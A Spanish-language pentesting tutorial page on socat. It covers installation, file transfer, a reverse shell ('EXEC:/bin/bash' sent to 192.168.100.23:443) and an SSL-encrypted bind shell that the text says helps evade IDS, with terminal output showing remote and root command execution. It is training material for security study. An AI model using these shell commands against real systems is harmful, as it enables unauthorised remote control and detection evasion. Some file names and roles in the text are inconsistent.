# 1.2.2 Socat

**`Socat`** es una utilidad de línea de comandos que establece dos flujos de byte bidireccionales y transfiere datos entre ellos. Para las pruebas de penetración, es similar a Netcat, pero tiene características útiles adicionales.&#x20;

Como instalar:

{% tabs %}
{% tab title="Ubuntu" %}
apt-get install socat
{% endtab %}

{% tab title="Arch" %}
pacman -S socat
{% endtab %}
{% endtabs %}

### Netcat vs Socat

Primero, conectémonos a un servidor remoto en el puerto 80 usando Netcat y socat:

{% tabs %}
{% tab title="Netcat" %}
nc \<ip-address> 80
{% endtab %}

{% tab title="Socat" %}
socat - TCP4:\<ip-address>:80
{% endtab %}
{% endtabs %}

Tenga en cuenta que la sintaxis es similar, pero socat requiere el **`-`** para transferir datos entre STDIO y el host remoto, y el protocolo (TCP4). El protocolo, las opciones y el número de puerto están delimitados por dos puntos.

Dado que se requieren privilegios de root para enlazar un agente de escucha a puertos inferiores a 1024, debemos usar sudo al iniciar un agente de escucha en el puerto 443.

{% tabs %}
{% tab title="Netcat" %}
sudo nc -lvp localhost 443
{% endtab %}

{% tab title="Socat" %}
sudo socat TCP4-LISTEN:443 STDOUT
{% endtab %}
{% endtabs %}

La adición requerida tanto del protocolo para el agente de escucha (TCP4-LISTEN) como del argumento STDOUT, que redirige la salida estándar.

### Transferencias de archivos con Socat

Supongamos que Alice necesita enviarle a Bob un archivo llamado tests.txt.&#x20;

Compartiremos el archivo en el puerto **`443`**. En este ejemplo,  los parámetros utilizados:

* **`TCP4-LISTEN`** especifica un agente de escucha IPv4,&#x20;
* **`fork`** crea un proceso secundario una vez que se realiza una conexión con el agente de escucha, lo que permite varias conexiones, y&#x20;
* **`file:`** especifica el nombre de un archivo que se va a transferir:

```
alice@machine:~$ sudo socat TCP4-LISTEN:443,fork file:test.txt
```

Por el lado de Bob, nos conectaremos a la computadora de Alice y recuperaremos el archivo. En este ejemplo, los parámetros utilizados:

* **`TCP4`** especifica IPv4, seguido de la dirección IP de Alice (**`10.11.0.4`**) y el número de puerto de escucha (**`443`**),&#x20;
* **`file:`** especifica el nombre de archivo local en el que se guardará el archivo en el equipo de Bob y&#x20;
* **`create`** específica que se creará un nuevo archivo:

```
bob@machine:~$ socat TCP4:192.168.100.23:443 file:test.txt,create
bob@machine:~$ ls -l test.txt 
-rw-rw-r-- 1 guillermocm guillermocm 476 oct 18 22:39 test.txt
```

### Reverse Shells

Bob iniciará un oyente en el puerto 443. Para hacer esto, proporcionará la opción **`-d -d`** para aumentar la verbosidad (mostrando mensajes fatales, de error, advertencia y aviso), **`TCP4-LISTEN:443`** para crear un agente de escucha IPv4 en el puerto 443 y **`STDOUT`** para conectar la salida estándar (STDOUT) al socket TCP:

```
bob@machine:~$ socat -d -d TCP4-LISTEN:443 STDOUT
2021/10/18 18:01:16 socat[291393] N listening on AF=2 0.0.0.0:443
```

A continuación, Alice utilizará la opción **`EXEC`** de socat (similar a la opción Netcat -e), que ejecutará el programa dado una vez que se establezca una conexión remota. En este caso, Alice enviará un shell inverso /bin/bash (con **`EXEC:/bin/bash`**) al socket de escucha de Bob en 192.168.100.23:443

```
alice@machine:~$ socat TCP4:192.168.100.23:443 EXEC:/bin/bash
```

Una vez conectado, Bob puede ingresar comandos de su sesión de socat, que se ejecutarán en la máquina de Alice.

```
bob@machine:~$ socat -d -d TCP4-LISTEN:443 STDOUT
2021/10/18 18:01:16 socat[291393] N listening on AF=2 0.0.0.0:443
2021/10/18 18:01:17 socat[291393] N accepting connection from AF=2 192.168.100.106:58618 on AF=2 192.168.100.23:443
2021/10/18 18:01:17 socat[291393] N using stdout for reading and writing
2021/10/18 18:01:17 socat[291393] N starting data transfer loop with FDs [6,6] and [1,1]
whoami
alice
```

### Bind Shells Cifrada

Para agregar cifrado a una bind shell, nos basaremos en certificados SSL. Este nivel de cifrado ayudará a evadir IDS (Sistema de detección de intrusos) y ayudará a ocultar los datos confidenciales que estamos transfiriendo. Para continuar con el ejemplo de Alice y Bob, usaremos **`openssl`** para crear un certificado autofirmado utilizando las siguientes opciones:

* **req**: iniciar una nueva solicitud de firma de certificado.
* **-newkey**: generar una nueva clave privada.
* **rsa:2048**: RSA con una longitud de clave de 2.048 bits.
* **-nodes**: almacenar la clave privada sin protección de frase de contraseña.
* **-keyout**: guardar la clave en un archivo.
* **-x509**: generar un certificado autofirmado en lugar de una solicitud de certificado.
* **-days**: establece el período de validez en días.
* **-out**: guarde el certificado en un archivo.

Una vez que generemos la clave, convertiremos el certificado y su clave privada en un archivo, que eventualmente usaremos para cifrar nuestra bind shell.

```
bob@machine:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind.crt
Generating a RSA private key
....................................+++++
.+++++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Primero debemos convertirlos a un formato que socat aceptará. Para ello, combinamos los archivos bind.key y bind.crt en un único archivo .pem.&#x20;

```
bob@machine:~$ ls
bind.crt  bind.key

bob@machine:~$ cat bind.* > bind.pem
```

Usaremos los parámetros **`OPENSSL-LISTEN:443`** para ponernos en escucha en el puerto 443, **`cert=bind.pem`** para especificar nuestro archivo de certificado, **`-verify=0`** para deshabilitar la verificación SSL y **`fork`** para generar un proceso hijo una vez que se realice una conexión con el listener:

```
bob@machine:~$ sudo socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork EXEC:/bin/bash
```

Usaremos **`-`** para transferir datos entre STDIO y el host remoto, **`OPENSSL`** para establecer una conexión SSL remota al listener de Alice en **`192.168.100.23:443`**, y **`verify=0`** para deshabilitar la verificación del certificado SSL:

```
alice@machine:~$ socat - OPENSSL:192.168.100.23:443,verify=0
whoami
root
```
